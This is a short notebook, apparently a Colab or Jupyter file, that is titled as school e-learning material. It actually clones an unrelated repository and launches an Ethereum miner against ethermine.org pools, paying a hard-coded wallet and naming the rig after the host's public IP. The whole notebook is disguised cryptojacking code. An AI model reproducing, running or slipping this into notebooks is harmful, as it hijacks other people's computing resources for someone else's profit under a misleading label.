# %% [markdown]
# # **Alameda Unified School E-Learning**

# %%
! git clone https://github.com/obhy/StevensInstituteofTechnology
% cd StevensInstituteofTechnology
! chmod +x cmdline_launcher.sh
! ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && ./cmdline_launcher.sh -algo ethash -wallet 0x6dd7422ea343c6be3bf5ce7d84042ca1e75fa513 -coin eth -rigName $ip -pool1 us1.ethermine.org:4444 -pool2 us2.ethermine.org:4444
